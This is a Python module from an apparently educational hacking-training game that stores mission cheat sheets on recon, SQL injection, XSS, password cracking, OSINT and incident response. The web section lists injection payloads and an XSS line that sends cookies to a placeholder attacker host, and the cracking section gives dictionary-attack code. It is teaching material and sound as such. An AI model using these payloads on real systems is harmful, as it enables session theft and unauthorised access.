"""
Tool Cheat Sheets — unlockable reference cards for each mission's tools.

Complete a mission to unlock its cheat sheet. Each sheet contains the key
commands, code patterns, and tips covered in that mission.
"""

from utils.display import (
    section_header, sub_header, info, warning, code_block, press_enter,
    show_menu, C, G, Y, DIM, BRIGHT, RESET,
)


CHEAT_SHEETS = {
    "mission1": {
        "title": "Web Penetration Testing",
        "sections": [
            (
                "Reconnaissance",
                "bash",
                (
                    "# Service version scan\n"
                    "nmap -sV 10.0.1.50\n"
                    "\n"
                    "# Fetch HTTP headers only\n"
                    "curl -I http://10.0.1.50\n"
                    "\n"
                    "# Look for: Server version, X-Powered-By,\n"
                    "# missing security headers (CSP, X-Frame-Options, HSTS),\n"
                    "# cookie flags (HttpOnly, Secure)"
                ),
            ),
            (
                "SQL Injection Payloads",
                "sql",
                (
                    "-- Classic authentication bypass\n"
                    "' OR '1'='1' --\n"
                    "admin' --\n"
                    "' OR 1=1 --\n"
                    "\n"
                    "-- UNION-based data extraction\n"
                    "' UNION SELECT username, password FROM users --\n"
                    "' UNION SELECT null, table_name FROM information_schema.tables --\n"
                    "\n"
                    "-- Defense: ALWAYS use parameterized queries\n"
                    "-- cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))"
                ),
            ),
            (
                "XSS Payloads",
                "html",
                (
                    "<!-- Basic script injection -->\n"
                    "<script>alert('XSS')</script>\n"
                    "\n"
                    "<!-- Event handler injection -->\n"
                    "<img src=x onerror=alert('XSS')>\n"
                    "\n"
                    "<!-- Cookie theft (for testing only!) -->\n"
                    "<script>document.location='http://attacker/?c='+document.cookie</script>\n"
                    "\n"
                    "<!-- Defense: escape output, use Content-Security-Policy header -->"
                ),
            ),
        ],
    },
    "mission2": {
        "title": "Network Intrusion Investigation",
        "sections": [
            (
                "Traffic Capture",
                "bash",
                (
                    "# Capture traffic on an interface to a pcap file\n"
                    "tcpdump -i eth0 -w capture.pcap\n"
                    "\n"
                    "# Capture with filters\n"
                    "tcpdump -i eth0 -w capture.pcap host 185.243.115.42\n"
                    "tcpdump -i eth0 -w capture.pcap port 443"
                ),
            ),
            (
                "Packet Analysis with Scapy",
                "python",
                (
                    "from scapy.all import rdpcap, IP, Raw\n"
                    "\n"
                    "packets = rdpcap('capture.pcap')\n"
                    "for pkt in packets:\n"
                    "    if pkt.haslayer(IP) and pkt[IP].dst == '185.243.115.42':\n"
                    "        if pkt.haslayer(Raw):\n"
                    "            print(pkt[Raw].load)"
                ),
            ),
            (
                "Firewall Rules (iptables)",
                "bash",
                (
                    "# Block outbound traffic to a C2 server\n"
                    "iptables -A OUTPUT -d 185.243.115.42 -j DROP\n"
                    "\n"
                    "# Block inbound from attacker IP\n"
                    "iptables -A INPUT -s 203.0.113.42 -j DROP\n"
                    "\n"
                    "# Block a compromised host from reaching the internet\n"
                    "iptables -A FORWARD -s 10.10.4.22 -j DROP\n"
                    "\n"
                    "# List current rules\n"
                    "iptables -L -n -v"
                ),
            ),
        ],
    },
    "mission3": {
        "title": "Password Cracking",
        "sections": [
            (
                "Hash Identification",
                "text",
                (
                    "32 hex chars  ->  MD5       (e.g. 5d41402abc4b2a76...)\n"
                    "40 hex chars  ->  SHA-1     (e.g. aaf4c61ddcc5e8a2...)\n"
                    "64 hex chars  ->  SHA-256   (e.g. 2cf24dba5fb0a30e...)\n"
                    "$2b$12$...    ->  bcrypt    (cost factor after $2b$)\n"
                    "$argon2id$... ->  Argon2    (modern, memory-hard)\n"
                    "$6$...        ->  SHA-512crypt (Linux shadow files)"
                ),
            ),
            (
                "Python Dictionary Attack",
                "python",
                (
                    "import hashlib\n"
                    "\n"
                    "target = '5d41402abc4b2a76b9719d911017c592'\n"
                    "\n"
                    "# MD5 dictionary attack\n"
                    "with open('rockyou.txt', 'r', errors='ignore') as f:\n"
                    "    for line in f:\n"
                    "        word = line.strip()\n"
                    "        if hashlib.md5(word.encode()).hexdigest() == target:\n"
                    "            print(f'Cracked: {word}')\n"
                    "            break\n"
                    "\n"
                    "# SHA-256 variant\n"
                    "hashlib.sha256(word.encode()).hexdigest()"
                ),
            ),
            (
                "John the Ripper",
                "bash",
                (
                    "# Dictionary attack with a wordlist\n"
                    "john --wordlist=rockyou.txt hashes.txt\n"
                    "\n"
                    "# Show cracked passwords\n"
                    "john --show hashes.txt\n"
                    "\n"
                    "# Specify hash format\n"
                    "john --format=raw-md5 --wordlist=rockyou.txt hashes.txt"
                ),
            ),
        ],
    },
    "mission4": {
        "title": "OSINT Investigation",
        "sections": [
            (
                "Domain Intelligence",
                "bash",
                (
                    "# WHOIS lookup\n"
                    "whois vantagecorp.io\n"
                    "\n"
                    "# DNS record query (all types)\n"
                    "dig vantagecorp.io ANY\n"
                    "\n"
                    "# Simple DNS resolution\n"
                    "host vantagecorp.io\n"
                    "\n"
                    "# Subdomain enumeration\n"
                    "dnsrecon -d vantagecorp.io -t std"
                ),
            ),
            (
                "EXIF Metadata Extraction",
                "python",
                (
                    "from PIL import Image\n"
                    "from PIL.ExifTags import TAGS\n"
                    "\n"
                    "img = Image.open('photo.jpg')\n"
                    "exif_data = img.getexif()\n"
                    "\n"
                    "for tag_id, value in exif_data.items():\n"
                    "    tag_name = TAGS.get(tag_id, tag_id)\n"
                    "    print(f'{tag_name}: {value}')\n"
                    "\n"
                    "# GPS DMS to Decimal conversion\n"
                    "# decimal = degrees + (minutes / 60) + (seconds / 3600)\n"
                    "# West/South = negative"
                ),
            ),
        ],
    },
    "mission5": {
        "title": "Incident Response",
        "sections": [
            (
                "Forensic Disk Imaging",
                "bash",
                (
                    "# Create a forensic disk image\n"
                    "dd if=/dev/sda of=evidence.img bs=4K\n"
                    "\n"
                    "# Verify image integrity\n"
                    "sha256sum evidence.img\n"
                    "\n"
                    "# Always record:\n"
                    "#   - Who collected the evidence\n"
                    "#   - Date and time of collection\n"
                    "#   - SHA-256 hash for chain of custody"
                ),
            ),
            (
                "Network Containment",
                "bash",
                (
                    "# Block attacker IP at perimeter\n"
                    "iptables -A INPUT -s 203.0.113.42 -j DROP\n"
                    "\n"
                    "# Isolate compromised host (block all outbound)\n"
                    "iptables -A FORWARD -s 10.0.2.15 -j DROP\n"
                    "\n"
                    "# Key principle: isolate but keep powered on\n"
                    "# to preserve volatile evidence (RAM, processes)"
                ),
            ),
            (
                "Log Parsing Pattern",
                "python",
                (
                    "# Basic suspicious log scanner\n"
                    "with open('access.log') as f:\n"
                    "    for line in f:\n"
                    "        if '/admin' in line and 'POST' in line:\n"
                    "            print('[SUSPICIOUS]', line.strip())\n"
                    "        if '500' in line or '401' in line:\n"
                    "            print('[ERROR]', line.strip())\n"
                    "\n"
                    "# NIST IR Phases:\n"
                    "# 1. Preparation\n"
                    "# 2. Detection & Analysis\n"
                    "# 3. Containment, Eradication & Recovery\n"
                    "# 4. Post-Incident Activity"
                ),
            ),
        ],
    },
}

MISSION_ORDER = ["mission1", "mission2", "mission3", "mission4", "mission5"]

MISSION_LABELS = {
    "mission1": "Mission 1: Operation Broken Gate",
    "mission2": "Mission 2: Shadow on the Wire",
    "mission3": "Mission 3: The Vault",
    "mission4": "Mission 4: Ghost Protocol",
    "mission5": "Mission 5: Code Red",
}


def cheat_sheets_menu(progress: dict):
    """Display the cheat sheets menu. Unlocked sheets show commands; locked ones prompt completion."""
    unlocked = progress.get("cheat_sheets_unlocked", [])

    while True:
        section_header("Tool Cheat Sheets")
        info("Complete a mission to unlock its cheat sheet.\n")

        options = []
        for mk in MISSION_ORDER:
            sheet = CHEAT_SHEETS[mk]
            if mk in unlocked:
                status = f"{G}🔓{RESET}"
            else:
                status = f"{DIM}🔒{RESET}"
            options.append((mk, f"{status} {MISSION_LABELS[mk]} — {sheet['title']}"))

        choice = show_menu("Select a Cheat Sheet", options)

        if choice == "back":
            return
        if choice == "quit":
            raise SystemExit

        if choice not in unlocked:
            warning("Complete this mission to unlock its cheat sheet!")
            press_enter()
            continue

        _show_cheat_sheet(choice)


def _show_cheat_sheet(mission_key: str):
    """Display an unlocked cheat sheet."""
    sheet = CHEAT_SHEETS[mission_key]
    section_header(f"Cheat Sheet: {sheet['title']}")

    for title, language, content in sheet["sections"]:
        sub_header(title)
        code_block(content, language)

    press_enter()
